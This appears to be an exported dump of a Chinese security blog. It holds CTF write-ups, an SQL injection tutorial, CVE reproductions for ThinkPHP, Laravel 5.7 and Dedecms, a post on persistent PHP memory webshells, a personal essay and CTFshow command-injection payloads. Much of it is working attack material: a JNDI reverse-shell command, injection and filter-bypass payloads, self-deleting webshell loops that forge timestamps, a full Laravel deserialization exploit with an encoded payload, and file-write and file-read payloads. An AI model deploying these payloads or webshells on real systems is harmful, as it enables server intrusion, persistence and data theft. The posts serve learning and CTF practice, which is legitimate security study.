./marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://xxx:50026/#Test\" 这里的端口要和http服务的端口一致！！ 0x05 干他！喜闻乐见的的地方来了 点击submit 可以看到这里已经加载了恶意类，而我们监听的端口已经反弹到了shell 打完收工！ 后续也会写一下这个漏洞的源码分析，就是不知道让不让发。","categories":[{"name":"wp","slug":"wp","permalink":"http://h3geeker.top/categories/wp/"}],"tags":[{"name":"做题记录","slug":"做题记录","permalink":"http://h3geeker.top/tags/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"}]},{"title":"SQL注入基础","slug":"sql注入基础","date":"2021-12-06T12:25:28.274Z","updated":"2021-12-06T12:29:56.638Z","comments":true,"path":"posts/e1ba94c8.html","link":"","permalink":"http://h3geeker.top/posts/e1ba94c8.html","excerpt":"","text":"什么是SQL注入理解SQL注入SQL注入是一种将SQL代码插入或添加到应用（用户）的输入参数中的攻击，之后再将这些参数传递给后台的SQL服务器加以解析并执行 /sql.php?uid=1 /sql.php?uid=1 or 1=1 SQL注入：内联注入是指插入查询注入SQL代码后，原来的查询依然会全部执行 [注入]-----&gt;[原来的语句]=========&gt;[原来的(注入)语句] 确认注入点###字符串注入的特征值 测试字符串 变种 预期结果 ‘ 触发错误。如果成功，数据库将返回一个错误 1’ or ‘1’=’1 1’) or (‘1’=’1 恒为真条件。如果成功，将返回表中所有的行 value’ or ‘1’=’2 value1’) or (‘1’=’2 空条件。如果成功，则返回与原来的值相同的结果 1’and ‘1’=’1 1’) adn (‘1’=1 恒为假条件。如果成功，则不返回表中任何行 1’ or ‘ab’ =’a’+’b 1’) or (‘ab’=’a’+’b Sql server串联。如果成功，则返回永真条件相同的信息 1’ or ‘ab’ =’a’ ‘b 1’) or (‘ab’=’a’ ‘b Mysql串联。如果成功，则返回永真条件相同的信息 1’ or ‘ab’=’a’||’b 1’) or (‘ab’=’a’||’b Oracle串联。如果成功，则返回与永真条件相同的信息 数字注入的特征值 测试字符串 变种 预期结果 ‘ 触发错误。如果成功，数据库将返回一个错误 1+1 2-1 如果成功，则返回与操作结果相同的值 value+1 如果成功，则返回与原来请求相同的值 or 1 = 1 1) or (1-1 恒为真条件。如果成功，将返回表中所有的行 value or 1=2 value) or (1=2 空条件。如果成功，则返回与原来的值相同的结果 and 1=2 and (1=2 恒为假条件。如果成功，则不返回表中任何行 1’ or ‘ab’ =’a’+’b 1’) or (‘ab’=’a’+’b Sql server串联。如果成功，则返回永真条件相同的信息 1’ or ‘ab’ =’a’ ‘b 1’) or (‘ab’=’a’ ‘b Mysql串联。如果成功，则返回永真条件相同的信息 1’ or ‘ab’=’a’||’b 1’) or (‘ab’=’a’||’b Oracle串联。如果成功，则返回与永真条件相同的信息 显错注入联合查询union select使用联合查询需要注意，前面的字段需要和后面的字段数相等： select id,user,content from users where id=1 union select 1,2,3 ###order by 当我们使用 order by 4 成功，使用order by 5报错时 就可以判断字段为4 order by是mysql中对查询数据进行排序的方法， 使用示例 select * from 表名 order by 列名(或者数字) asc；升序(默认升序) select * from 表名 order by 列名(或者数字) desc；降序 所以可以利用order by 来查询字段数 #(注释符)在语句末尾，注释查询语句后面的多余字符 select * from users where id = '1' select * from users where id = '1' union select 1,2,3 #' #可以被--+代替 information_schema库Mysql5版本之后，由于information_schema库的存在，注入攻击相对来说方便了许多，其使用方法通常为如下几种： 通过对Mysql的数据进行猜解获取敏感的信息，来进一步通过网站的各种功能获取控制权。 通过load_file()函数来读取脚本代码或系统敏感文件内容，进行漏洞分析或直接获取数据库连接账号、密码。 通过dumpfile/outfile函数导出获取webshell 利用上面的这几种方法，可以很轻易地攻击入侵Mysql5数据库搭建的网站服务器 简单的注入流程?id=1'//测试注入点 ?id=1' order by 5#//猜字段 ?id=0' union select 1,2,3,4# //测试页面回显 ?id=0' union select 1,database(),3,4# //查看数据库名 ?id=0' union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='db'# ?id=0' union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name ='flag'# ?id=0' union select 1,content,3,4 from flag# 报错注入报错函数extractvalue() 作用是从目标xml种返回包含所查询值得字符串 id = 1 and (extractvalue(1,concat(0x5c,(select user())))); updatexml() 作用就是改变（查找并替换）xml文档中符合条件的节点值 id = 1 and(updatexml(0x3a,concat(1,(select user())),1)); 0x3a是:的作用 而且updatexml()较为常用 注入模板： id = 1 and(updatexml(0x3a,concat(1,(select database())),1)); id = 1 and(updatexml(0x3a,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema='db')),1)); id = 1 and(updatexml(0x3a,concat(1,(select group_concat(colunm_name) from information_schema.column where table_name='flag')),1)); id = 1 and(updatexml(0x3a,concat(1,(select content from flag)),1)); id = 1 and(updatexml(0x3a,concat(1,(select substring(content,1,10)from flag)),1)); exp() 当传递有一个大于709的值，函数exp()就会引起一个溢出错误 id = 1 and EXP(~(select * from(select user())a)); floor() floor是mysql的一个取整函数 id = 1 and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a); 盲注布尔盲注布尔盲注可能用到的函数ascii()括号中的参数转化为相应的ascii码 substr()substr(a,b,c)从b位置开始，截取字符串a的c长度 mid()用法与substr()类似 length()返回str字符串的长度 left(database(),1)取database字符串的左边第一个 时间盲注可能用到的函数if(a,b,c)a为条件，a为true，返回b，否则返回c，如if(1&gt;2,1,0)，返回0 sleep()执行挂起一段时间 利用方式： and if(mid(version(),1,1)=1,sleep(10),1) 盲注脚本= = 百度上很多 自己写！！ 绕过方法大小写绕过&lt;?php include ('config.php'); highlight_file(__FILE__); $id=$_REQUEST[\"id\"]; if (preg_match('/select|union/',$id)){ die('hack'); } $result=mysqli_query($con,\"SELECT first_name,lastname FROM users WHERE user_id='$id';\"); $row =mysqli_fetch_array($result); echo $row['firstname'].':'.$row['lastname']; ?&gt; if (preg_match('/select/union/',$id)){ die('hack'); } 因为这里没加/select/union/i 所以可以 sql语句是不区分大小写的少数情况下代码中没有过滤完整就可以使用大小写的方法绕过 双写绕过&lt;?php include ('config.php'); highlight_file(__FILE__); $id=$_REQUEST[\"id\"]; $id=preg_replace('/select|union/i','',$id); $result=mysqli_query($con,\"SELECT first_name,lastname FROM users WHERE user_id='$id';\"); $row =mysqli_fetch_array($result); echo $row['firstname'].':'.$row['lastname']; ?&gt; 代码中使用preg_replace()函数对关键字进行替换，并且只进行了一次替换，可以使用双写的方法来绕过 空格绕过&lt;?php include ('config.php'); highlight_file(__FILE__); $id=$_REQUEST[\"id\"]; if (preg_match('/ /i',$id)){ die('hack'); } $result=mysqli_query($con,\"SELECT first_name,lastname FROM users WHERE user_id='$id';\"); $row =mysqli_fetch_array($result); echo $row['firstname'].':'.$row['lastname']; ?&gt; 当空格被过滤的情况下，可以使用： /**/ /*!*/ %0a %0b %0c %0d %09 #号绕过&lt;?php include ('config.php'); highlight_file(__FILE__); $id=$_REQUEST[\"id\"]; if (preg_match('/#/i',$id)){ die('hack'); } $result=mysqli_query($con,\"SELECT first_name,lastname FROM users WHERE user_id='$id';\"); $row =mysqli_fetch_array($result); echo $row['firstname'].':'.$row['lastname']; ?&gt; #是注释符，可以用其他注释符绕过 --+ -- ` ; /**/ 逗号绕过&lt;?php include ('config.php'); highlight_file(__FILE__); $id=$_REQUEST[\"id\"]; if (preg_match('/,/i',$id)){ die('hack'); } $result=mysqli_query($con,\"SELECT first_name,lastname FROM users WHERE user_id='$id';\"); $row =mysqli_fetch_array($result); echo $row['firstname'].':'.$row['lastname']; ?&gt; 逗号无法用替换法绕过，所以需要其他函数来绕过 union select 1,2# 等价于 union select * from (select 1)a join (select 2)b# 在大多数情况下、需要在盲注中绕过逗号 使用substr()、mid()这两个语句都可以使用from for来绕过 and ascii(mid((database()),1,1))=1# 等价于 and ascii(mid((database())from 1 for 1))=1# sleep()绕过sleep()通常使用在盲注的延时注入中 如果sleep()被ban，我们可以使用benchmark()函数 ##substr()绕过 substr()通常也在盲注中 可以用mid()、substring()、left()、right()替换","categories":[{"name":"学习","slug":"学习","permalink":"http://h3geeker.top/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://h3geeker.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"Thinkphp < 6.0.2 session id未作过滤导致getshell","slug":"Thinkphp  6.0.2 session id未作过滤导致getshell","date":"2021-11-22T11:42:05.858Z","updated":"2021-11-22T11:47:46.212Z","comments":true,"path":"posts/d1a4aa03.html","link":"","permalink":"http://h3geeker.top/posts/d1a4aa03.html","excerpt":"","text":"Thinkphp &lt; 6.0.2 session id未作过滤导致getshell一、漏洞简介Thinkphp &lt; 6.0.2 session id未作过滤导致getshell 二、漏洞影响Thinkphp &lt; 6.0.2 三、漏洞分析6.0.1在设置session id时未对值进行ctype_alnum()校验，从而导致可以传入任意字符。 看一下保存session是怎么写的 public function save(): void { $this-&gt;clearFlashData(); $sessionId = $this-&gt;getId(); if (!empty($this-&gt;data)) { $data = $this-&gt;serialize($this-&gt;data); $this-&gt;handler-&gt;write($sessionId, $data); } else { $this-&gt;handler-&gt;delete($sessionId); } $this-&gt;init = false; } 先获取sessionid，然后作为参数传入 $this-&gt;handler-&gt;write($sessionId, $data),$this-&gt;handler在构造函数中被初始化 跟进查看一下 public function __construct($name, SessionHandlerInterface $handler, array $serialize = null) { $this-&gt;name = $name; $this-&gt;handler = $handler; if (!empty($serialize)) { $this-&gt;serialize = $serialize; } $this-&gt;setId(); } 可以看出$handler的类型是SessionHandlerInterface，全局发现这是一个接口，实现这个接口的类有两个，一个是File，一个是Cache。这里以File类为例，我们跟进它的write()方法 public function write(string $sessID, string $sessData): bool { $filename = $this-&gt;getFileName($sessID, true); $data = $sessData; if ($this-&gt;config['data_compress'] &amp;&amp; function_exists('gzcompress')) { //数据压缩 $data = gzcompress($data, 3); } return $this-&gt;writeFile($filename, $data); } 这里先通过第一个参数（也就是session id）来构造$filename，然后判断是否需要对session数据进行压缩，默认是不需要的，最后return时调用$this-&gt;writeFile()。先看看文件名是如何构造的，跟进$this-&gt;getFileName() protected function getFileName(string $name, bool $auto = false): string { if ($this-&gt;config['prefix']) { $name = $this-&gt;config['prefix'] . DIRECTORY_SEPARATOR . 'sess_' . $name; } else { $name = 'sess_' . $name; } $filename = $this-&gt;config['path'] . $name; ... return $filename; } 这里直接将第一个参数拼接到路径的最后。跟进之前的$this-&gt;writeFile()方法 protected function writeFile($path, $content): bool { return (bool) file_put_contents($path, $content, LOCK_EX); } 这里用到了file_put_contents()保存文件，但是程序未对session id进行危险字符判断。 所以我们可以利用该漏洞来写入webshell.php 继续往下看 public function handle($request, Closure $next) { // Session初始化 $varSessionId = $this-&gt;app-&gt;config-&gt;get('session.var_session_id'); $cookieName = $this-&gt;session-&gt;getName(); if ($varSessionId &amp;&amp; $request-&gt;request($varSessionId)) { $sessionId = $request-&gt;request($varSessionId); } else { $sessionId = $request-&gt;cookie($cookieName); } if ($sessionId) { $this-&gt;session-&gt;setId($sessionId); } 这里的$sessionId的值由$request-&gt;cookie($cookieName)获得，$cookieName经过跟进后发现默认是PHPSESSID 所以我们可以设置Cookie中的PHPSESSID的值为xxxxx.php 四、漏洞复现复现之前我们需要开启session 在\\app\\middleaware.php中把\\think\\middleware\\SessionInit::class注释取消 然后在\\app\\controller\\index.php中加入入口 然后bp抓包，构造poc 发现写入成功了，访问一下写入的文件 五、漏洞复现1、对session id 加一个过滤，使用ctype_alnum() $this-&gt;id = is_string($id) &amp;&amp; strlen($id) === 32 ctype_alnum（$id） &amp;&amp; ? $id : md5(microtime(true) . session_create_id()); 2、更新Thinkphp版本","categories":[{"name":"CVE复现","slug":"CVE复现","permalink":"http://h3geeker.top/categories/CVE%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"CVE漏洞复现","slug":"CVE漏洞复现","permalink":"http://h3geeker.top/tags/CVE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}]},{"title":"PHP不死马初探","slug":"php不死🐎","date":"2021-11-22T11:41:14.069Z","updated":"2021-11-22T12:00:08.689Z","comments":true,"path":"posts/a0ce185.html","link":"","permalink":"http://h3geeker.top/posts/a0ce185.html","excerpt":"","text":"什么是不死马内存马，通俗讲就是不死马，就是会运行一段永远不退出的程序常驻在PHP进程里，无限执行。 流程大概为：不死马.php–&gt;上传到服务器–&gt;服务器执行–&gt;在服务器上循环生成 用以上流程达到不死的效果 可用的php函数1.ignore_user_abort(true); --&gt;函数设置与客户机断开是否会终止脚本的执行。这里设置为true则忽略与用户的断开，即使与客户机断开脚本仍会执行。 2.set_time_limit() --&gt;函数设置脚本最大执行时间。这里设置为0，即没有时间方面的限制。 3.unlink(__FILE__) --&gt;删除文件本身，以起到隐蔽自身的作用。 4.system() --&gt;执行的命令用于修改文件的创建或修改时间，可以绕过“find –name '*.php' –mmin -10”命令检测最近10分钟修改或新创建的PHP文件，但不一定有用，可选。 来个简单的例子&lt;?php ignore_user_abort(true); //函数设置与客户机断开是否会终止脚本的执行。这里设置为true则忽略与用户的断开，即使与客户机断开脚本仍会执行。 set_time_limit(0); //函数设置脚本最大执行时间。这里设置为0，即没有时间方面的限制。 unlink(__FILE__); //删除文件本身，以起到隐蔽自身的作用。 $file = '2.php'; $code = '&lt;?php if(md5($_GET[\"pass\"])==\"1a1dc91c907325c69271ddf0c944bc72\"){@eval($_POST[a]);} ?&gt;'; while (1){ file_put_contents($file,$code); //将一个字符串写入文件 system('touch -m -d \"2021-09-07 09:10:12\" .2.php'); usleep(5000); } ?&gt; 具体的思路就是，就是让客户机断开的时候，不死马也是可以运行 然后不断的生成新的后门文件 把自己删除，达到隐藏的目的 .为前缀的文件，还可以隐藏后门文件本身 我们来试一下 测试环境为 kali 虚拟机 在实验环境下创建马来模拟真是环境 查看一下进程 这是实验开始前的进程 然后给予shell.php文件的权限 然后运行一下 可以看到 原生成文件已经自我删除 查看进程 已经写入到内存 我们尝试删除生成的shell文件 会迅速再生 而且打开文件会提示一直在修改 此时解决办法： 1、查看进程然后kill掉进程最后删除木马 2、重启然后删除木马 成功清楚木马文件 当然这只是最简单的木马文件 下面我们来改进一下 &lt;?php ignore_user_abort(true); set_time_limit(0); unlink(__FILE__); $file = '2.php'; $code = '&lt;?php if(md5($_GET[\"pass\"])==\"1a1dc91c907325c69271ddf0c944bc72\"){@eval($_POST[a]);} ?&gt;'; while (1){ file_put_contents($file,$code); system('touch -m -d \"2018-12-01 09:10:12\" .2.php'); usleep(5000); } ?&gt; 如果我们将 $code = '&lt;?php if(md5($_GET[\"pass\"])==\"1a1dc91c907325c69271ddf0c944bc72\"){@eval($_POST[a]);} ?&gt;'; 注释掉就可以绕过这个shell 所以我们可以采用将shellbase64加密 同时进行md5校验 这样更加安全 &lt;?php ignore_user_abort(true); set_time_limit(0); $file = 'c.php'; $code = base64_decode('PD9waHAgZXZhbCgkX1BPU1RbY10pOz8+'); while(true) { if(md5(file_get_contents($file))===md5($code)) { file_put_contents($file, $code); } usleep(50); } ?&gt; emmm 貌似php不死马 目前我只能写这么多了 但是有个弊端 被攻击者更换目录，或者把目录移走 木马就会失效，所以我们可以遍历文件夹每个都写 随便激活一个即可 &lt;?php set_time_limit(0); ignore_user_abort(1); unlink(__FILE__); while(1){ sleep(1); if(file_exists('index.php')){ if(md5_file('{name}')==='912d7b3bbd5cf7405c9cc8f16156321b'){ }else{ file_put_contents('{name}',base64_decode('PD9waHAgZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFtoM10pKTs/Pg==')); } }else{ if(file_exists('{name}')){ unlink('{name}'); } } } ?&gt;","categories":[{"name":"学习","slug":"学习","permalink":"http://h3geeker.top/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://h3geeker.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"CVE-2019-9081 Laravel5.7 反序列化 RCE","slug":"CVE-2019-9081 Laravel5.7 反序列化 RCE","date":"2021-11-16T02:34:48.025Z","updated":"2021-11-16T02:37:26.243Z","comments":true,"path":"posts/598866b.html","link":"","permalink":"http://h3geeker.top/posts/598866b.html","excerpt":"","text":"CVE-2019-9081 Laravel5.7 反序列化 RCE一、漏洞简介Laravel Framework 5.7.x版本中的Illuminate组件存在反序列化漏洞，远程攻击者可利用该漏洞执行代码 二、漏洞影响Laravel5.7 三、漏洞分析laravel在5.7之后加入了PendingCommand类，同时发现了两个方法 PendingCommand类有魔术方法__destruct()，该方法调用run函数，然后run函数执行命令 我们跟进看一下构造方法 一共需要用到4个属性 我们继续跟进run方法看一下 注意$this-&gt;mockConsoleOutput(); 我们跟进看一下 继续跟进createABufferedOutputMock() 继续走下去，我们需要属性$this-&gt;test-&gt;expectedOutput 我们需要找到类中用expectedOutput 经过全局搜索，在Illuminate\\Foundation\\Testing\\Concerns，存在 但是这种类，需要用魔法方法get，来实例化 在vendor/laravel/framework/src/Illuminate/Auth/GenericUser.php中存在可以利用的get方法 设置键名为expectedOutput的数组，即可利用 现在就缺$app参数，我们回去接着跟进run方法 这里也很重要 $this-&gt;app[Kernel::class] 这里在实例化对象,再去调对应的call方法，跟着Kerne可以看到是在实例化 Illuminate\\Contracts\\Console\\Kernel 首先进入到 跟进make方法 跟进父类的make 跟进resolve 那么此时发现$concrete的值来自于getConcrete($abstract): vendor/laravel/framework/src/Illuminate/Container/Container.php 跟进getConcrete 注意这里 if (isset($this-&gt;bindings[$abstract])) { return $this-&gt;bindings[$abstract]['concrete']; } 如果bindings[$abstract]存在，则会返回bindings[$abstract][‘concrete’] bindings是类Container的属性，并且类Container中也有可以RCE的call方法。 到现在，我们可以整理一下思路 我们可以任意实例化类Container的子类，这样在其子类调用call的时候，会触发类Container的call方法，那么即可达成RCE 我们选择Illuminate\\Foundation\\Application而$abstract的值为Illuminate\\Contracts\\Console\\Kernel。那么此时我们容易知道$bindings只要存在键名为Illuminate\\Contracts\\Console\\Kernel的数组，就能进入该if条件句，那么我们只要按如下进行构造： 1.类PendingCommand 利用 destruct触发run()方法 2.类vendor/laravel/framework/src/Illuminate/Auth/GenericUser.php 构造数组 3.类vendor/laravel/framework/src/Illuminate/Auth/GenericUser.php 利用 get()魔法方法满足mockConsoleOutput 4.利用任意实例化对象，实例化Illuminate\\Foundation\\Application 5.调用call触发父类call方法RCE exp如下: &lt;?php namespace Illuminate\\Foundation\\Testing{ class PendingCommand{ protected $command; protected $parameters; protected $app; public $test; public function __construct($command, $parameters,$class,$app){ $this-&gt;command = $command; $this-&gt;parameters = $parameters; $this-&gt;test=$class; $this-&gt;app=$app; } } } namespace Illuminate\\Auth{ class GenericUser{ protected $attributes; public function __construct(array $attributes){ $this-&gt;attributes = $attributes; } } } namespace Illuminate\\Foundation{ class Application{ protected $hasBeenBootstrapped = false; protected $bindings; public function __construct($bind){ $this-&gt;bindings=$bind; } } } namespace{ $genericuser = new Illuminate\\Auth\\GenericUser(array(\"expectedOutput\"=&gt;array(\"0\"=&gt;\"1\"),\"expectedQuestions\"=&gt;array(\"0\"=&gt;\"1\"))); $application = new Illuminate\\Foundation\\Application(array(\"Illuminate\\Contracts\\Console\\Kernel\"=&gt;array(\"concrete\"=&gt;\"Illuminate\\Foundation\\Application\"))); $pendingcommand = new Illuminate\\Foundation\\Testing\\PendingCommand(\"phpinfo\",array('1'),$genericuser,$application); echo urlencode(serialize($pendingcommand)); } ?&gt; 四、漏洞复现在routes/web.php添加一条路由 Route::get('/index', 'TaskController@index'); 接下来在app/Http/Controllers文件夹下创建文件TaskController.php，源码如下: &lt;?php namespace App\\Http\\Controllers; highlight_file(__FILE__); class TaskController { public function index(){ if(isset($_GET['code'])) { $code=$_GET['code']; unserialize($code); return \"Welcome to H3'palce\"; } } } ?&gt; 利用exp生成payload 然后传值过去 payload： http://127.0.0.1/public/index.php/index?code=O%3A44%3A%22Illuminate%5CFoundation%5CTesting%5CPendingCommand%22%3A4%3A%7Bs%3A10%3A%22%00%2A%00command%22%3Bs%3A7%3A%22phpinfo%22%3Bs%3A13%3A%22%00%2A%00parameters%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A1%3A%221%22%3B%7Ds%3A6%3A%22%00%2A%00app%22%3BO%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3A2%3A%7Bs%3A22%3A%22%00%2A%00hasBeenBootstrapped%22%3Bb%3A0%3Bs%3A11%3A%22%00%2A%00bindings%22%3Ba%3A1%3A%7Bs%3A35%3A%22Illuminate%5CContracts%5CConsole%5CKernel%22%3Ba%3A1%3A%7Bs%3A8%3A%22concrete%22%3Bs%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3B%7D%7D%7Ds%3A4%3A%22test%22%3BO%3A27%3A%22Illuminate%5CAuth%5CGenericUser%22%3A1%3A%7Bs%3A13%3A%22%00%2A%00attributes%22%3Ba%3A2%3A%7Bs%3A14%3A%22expectedOutput%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A1%3A%221%22%3B%7Ds%3A17%3A%22expectedQuestions%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A1%3A%221%22%3B%7D%7D%7D%7D 五、漏洞修复1、删除__destruct中的$this-&gt;run()代码段 2、更新到新版本","categories":[{"name":"CVE复现","slug":"CVE复现","permalink":"http://h3geeker.top/categories/CVE%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"CVE漏洞复现","slug":"CVE漏洞复现","permalink":"http://h3geeker.top/tags/CVE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"CVE-2019-9081","slug":"CVE-2019-9081","permalink":"http://h3geeker.top/tags/CVE-2019-9081/"}]},{"title":"Nepnep两岁生日","slug":"Nepnep两周年","date":"2021-11-15T14:27:46.711Z","updated":"2021-11-16T02:19:11.273Z","comments":true,"path":"posts/ba1d201b.html","link":"","permalink":"http://h3geeker.top/posts/ba1d201b.html","excerpt":"","text":"今天是Nepnep联合战队的2岁生日，也是我来到这个战队的第8个月，也是我踏入安全这个行业的第8个月，我很笨，别人学习一个小时的知识，我需要学习1小天，前后斟酌了很久也没想好要不要踏入网络安全这一行业，当时我只是一个平平无奇的大二学生，成绩一般，也没什么特长，正在犹豫不决的时候，正好赶上了2021Nepctf，抱着试一试的态度，我参加了比赛，不出所料，差一点连签到都没签上，正好花花在群里招新，我就尝试了一下，感谢Nepnep收留了我，让我这个深处雾里的小菜鸡有了家，有了家就有了依靠，在这个大家庭里我遇到了好多好朋友，博学的傅总，我们的坏女人花花姐，吊毛HRP，吊毛二号阿毛，帅气的爱若，一直想gay我的驹仔，神秘的开心师父，我们的好姐姐贝塔，大坏蛋sharun，神秘的T神等等…很多很多我就不一一列举了，大家一起为自己热爱的拼搏着，一起学习，一起嘻嘻哈哈， 一起打比赛，有苦有乐，有开心也有失落，我们都在慢慢的成长，从一无所知的菜鸡，慢慢能够在比赛中有所输出，还记得在祥云杯熬夜奋战，虽然最后大家没有来到长春会和，但是我们都从失意中获得教训，每次一到大型比赛，就能看到群里大师父们突然出现，扛起大旗，首当其冲，我每每都很羡慕，也很愧疚，难过自己能力不足与帮助战队，也很有压力，大师父们不能一直都在，总有一天大旗会交到我们的手里，所以，我还是要努力学习，快速成长，不辜负前辈的期望。回首这8个月，我收获了知识，收获了荣誉，更重要的是我收获到了一群有着相同爱好的小伙伴和大哥哥大姐姐们，谢谢你们给我帮助和支持，让我在这条路上能够坚持下去，认识我都有点了解，我这个学校几乎没有从事安全行业的同学，如果你们的支持，我可能早就在这条路上放弃了，放弃自己热爱的东西，来思考现实，也感谢一路以来给予我帮助的师傅们，你们没有讨厌我傻x一样的问题，并且能够细心的解答我的困惑，同时我也要感谢一下我的女朋友，她并非计算机专业，却知道我在学习什么从事什么，虽然不能技术上帮助我，但是精神上对我很是支持。我很庆幸我能拥有这么一群好朋友，我也很庆幸我能够被这么多人喜欢，我也很庆幸我有一个知书达理的女朋友，最后希望大家都能够在这条路上越走越好，同时也祝愿Nepnep联合战队两岁生日快乐！","categories":[{"name":"随笔","slug":"随笔","permalink":"http://h3geeker.top/categories/%E9%9A%8F%E7%AC%94/"}],"tags":[{"name":"随笔","slug":"随笔","permalink":"http://h3geeker.top/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"2021湖湘杯web部分wp","slug":"2021湖湘杯web","date":"2021-11-14T13:30:22.000Z","updated":"2021-11-14T13:30:58.263Z","comments":true,"path":"posts/a17e1508.html","link":"","permalink":"http://h3geeker.top/posts/a17e1508.html","excerpt":"","text":"easywill本人sb，写好的wp被窝删掉了QAQ 很简单的一道题包含pearcmd.php（审计一下源码就能看到） 好像竞争上传也可以（没试） payload还记得 /index.php?+config-create+/&amp;&amp;name=cfile&amp;value=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=eval($_POST[1]);?&gt;+/tmp/shell.php 写入然后包含一下就行 Pentest in Autumn给了附件，打开之后发现是shiro框架 第一反应就是看看有没有actuator未授权访问漏洞 这样拿到key就可以工具一把梭哈 访问/actuator路由，有如下内容 继续访问heapdump，发现跳到了404 到这里卡了很久，后来想到能不能绕过一下 又看到Shiro &lt; 1.5.2 想到shiro权限绕过 CVE-2020-1957 https://blog.csdn.net/weixin_50464560/article/details/120752809 随即构造url /;/actuator/heapdump 成功下载到heapdump文件 接下来就是寻找key的过程 https://www.cnblogs.com/icez/p/Actuator_heapdump_exploit.html 参考此文章利用visualvm工具成功拿到了key 然后利用shiro attack 工具，一把梭","categories":[{"name":"wp","slug":"wp","permalink":"http://h3geeker.top/categories/wp/"}],"tags":[{"name":"大赛wp","slug":"大赛wp","permalink":"http://h3geeker.top/tags/%E5%A4%A7%E8%B5%9Bwp/"}]},{"title":"CVE-2019-8362 Dedecms v5.7 sp2 后台文件上传 getshell","slug":"CVE-2019-8362 Dedecms v5.7 sp2 后台文件上传 getshell","date":"2021-11-14T03:35:22.000Z","updated":"2021-11-14T07:58:22.767Z","comments":true,"path":"posts/f676a4bd.html","link":"","permalink":"http://h3geeker.top/posts/f676a4bd.html","excerpt":"","text":"CVE-2019-8362 Dedecms v5.7 sp2 后台文件上传 getshell一、漏洞简介上传zip文件解压缩对于文件名过滤不周，导致getshell 二、漏洞影响Dedecms v5.7 sp2 三、漏洞原理在dede/album_add.php的175行为上传文件后缀验证 跟进GetMatchFiles()函数 function GetMatchFiles($indir, $fileexp, &amp;$filearr) { $dh = dir($indir); while($filename = $dh-&gt;read()) { $truefile = $indir.'/'.$filename; if($filename == \".\" || $filename == \"..\") { continue; } else if(is_dir($truefile)) { $this-&gt;GetMatchFiles($truefile, $fileexp, $filearr); } else if(preg_match(\"/\\.(\".$fileexp.\")/i\",$filename)) { $filearr[] = $truefile; } } $dh-&gt;close(); } 在这行验证中可以看到 preg_match(\"/.(\".$fileexp.\")/i\",$filename) 只是判断了文件名中是否存在.jpg、.png、.gif中的一个 我们可以构造1.jpg.php来进行bypass 四、漏洞复现在本地存放一个php探针命名为1.jpg.php将其压缩为zip 然后在后台的常用操作-文件式管理器处上传压缩文件到soft目录下 将1.jpg.zip上传到soft目录 然后在dede/album_add.php中新建一个图集 上传成功后点击预览文档 成功后点击预览中的超链接 成功文件上传，如果将其换成webshell即可getshell 五、漏洞修复1、把/dede/file_class.php中的 else if(preg_match(\"/\\.(\".$fileexp.\")/i\",$filename)) 修改为： else if(substr($filename, -strlen($fileexp))===$fileexp) 2、及时更新版本","categories":[{"name":"CVE复现","slug":"CVE复现","permalink":"http://h3geeker.top/categories/CVE%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"CVE漏洞复现 , CVE-2019-8362","slug":"CVE漏洞复现-CVE-2019-8362","permalink":"http://h3geeker.top/tags/CVE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2019-8362/"}]},{"title":"CTFSHOW命令执行","slug":"CTFshow命令执行wp","date":"2021-11-11T03:35:22.000Z","updated":"2021-12-10T15:47:56.661Z","comments":true,"path":"posts/62244cdb.html","link":"","permalink":"http://h3geeker.top/posts/62244cdb.html","excerpt":"","text":"CTFSHOW命令执行web29过滤了flag payload： 随便写几个姿势 /?c=system(\"nl fl??????\"); /?c=system(\"nl fl*\"); /?c=system(\"nl fla''g.php\"); /?c=echo `nl fla\"\"g.php`; /?c=echo `nl fla\\g.php`; /?c=include($_GET[1]);&amp;1=php://filter/read=convert.base64-encode/resource=flag.php /?c=eval($_GET[1]);&amp;1=system('nl flag.php'); 剩下的我不会了 ##web30 过滤了flag|system|php 用echo 反引号来执行命令 payload： /?c=echo `nl fla\"\"g.p\"\"hp`; /?c=echo `nl fla?????`; /?c=echo `nl f*`; /?c=eval($_GET[1]);&amp;1=system('nl flag.php'); /?c=include($_GET[1]);&amp;1=php://filter/read=convert.base64-encode/resource=flag.php web31过滤了flag|system|php|cat|sort|shell|\\.| | 没关系，我们有都是姿势 payload： /?c=highlight_file(next(array_reverse(scandir(dirname(__FILE__))))); /?c=include($_GET[1]);&amp;1=php://filter/read=convert.base64-encode/resource=flag.php /?c=show_source(next(array_reverse(scandir(pos(localeconv()))))); ##web32 include不用括号，分号可以用?&gt;代替。 payload： /?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php /?c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(\"cat flag.php\");?&gt; /?c=include$_GET[1]?&gt;&amp;1=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg== web33-36payload： /?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php /?c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(\"cat flag.php\");?&gt; 